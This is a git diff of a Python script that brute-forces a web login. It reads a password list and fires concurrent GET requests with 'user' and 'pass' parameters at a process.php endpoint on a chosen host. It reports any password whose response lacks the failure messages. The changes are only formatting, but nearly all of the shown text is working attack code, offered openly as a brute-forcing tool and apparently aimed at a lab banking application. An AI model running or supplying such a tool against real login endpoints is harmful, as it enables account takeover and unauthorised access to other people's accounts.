@@ -21,21 +21,22 @@ parser.add_argument('-d', dest='destination',
 parser.add_argument('-p', dest='port',
                     type=int, default=80, help='PORT used to reach the server, by default is 80')
 parser.add_argument('-f', dest='psw_file',
-                    type=str, default="common_psw.txt", help='Filename where the password are stored, by default is common_psw.txt')
+                    type=str, default="common_psw.txt", help='Filename where the password are stored, '
+                    'by default is common_psw.txt')
 args = parser.parse_args()
 
-  
 URL = f"http://{args.destination}:{args.port}/process.php"
 USER = args.user
 N_REQ = args.n_req
 req = []
 
-f = open(args.psw_file, 'r')  
+f = open(args.psw_file, 'r')
+
 PARAMS = {
   'user': USER,
-  'pass':'',
-  'drop':'balance',
-  'amount': '',  
+  'pass': '',
+  'drop': 'balance',
+  'amount': '',
   }
 
 
@@ -45,33 +46,35 @@ def signal_handler(sig, frame):
     os._exit(1)
 
 
-# This funciton is run in a parallel thread, check the list of request trying to see new answer, in an affermative case the answer is checked. If is a failed
+# This funciton is run in a parallel thread, check the list of request trying to see new answer, 
+# in an affermative case the answer is checked. If is a failed
 # login the answer is discard, if is a successful login the used password is print onscreen and the application end.
 def check_response():
-  global req
-  while True:
-    for future in as_completed(req):
-      resp = future.result()
-      if "Invalid" not in resp.text and "authentication failed" not in resp.text:
-        print(f"\nGet a positive response using password {parse_qs(urlparse(resp.url).query)['pass']}:\n")
-        print(resp.text)
-        print("closing the application")
-        os._exit(1)
-      req.remove(future)
+    global req
+    while True:
+        for future in as_completed(req):
+            resp = future.result()
+            if "Invalid" not in resp.text and "authentication failed" not in resp.text:
+                print(f"\nGet a positive response using password {parse_qs(urlparse(resp.url).query)['pass']}:\n")
+                print(resp.text)
+                print("closing the application")
+                os._exit(1)
+            req.remove(future)
 
 
-# The script will start sendin N req/s to the URL setting a new password for each request. A request is then added to a list waiting for the answer
+# The script will start sendin N req/s to the URL setting a new password for each request. A request is
+#  then added to a list waiting for the answer
 def main():
-  global req
-  print(f'Starting brute forcing {USER} by sending {N_REQ} requests every second.')
-  session = FuturesSession()
-  for line in f:
-    PARAMS['pass'] = line.replace("\n", "")
-    req.append(session.get(url = URL, params = PARAMS))
-    time.sleep(1/N_REQ)
-  print("No match, exiting, waiting a few seconds for the last answer and exiting")
-  time.sleep(30)
-  os._exit(1)
+    global req
+    print(f'Starting brute forcing {USER} by sending {N_REQ} requests every second.')
+    session = FuturesSession()
+    for line in f:
+        PARAMS['pass'] = line.replace("\n", "")
+        req.append(session.get(url=URL, params=PARAMS))
+        time.sleep(1/N_REQ)
+    print("No match, exiting, waiting a few seconds for the last answer and exiting")
+    time.sleep(30)
+    os._exit(1)
 
 
 if __name__ == '__main__':
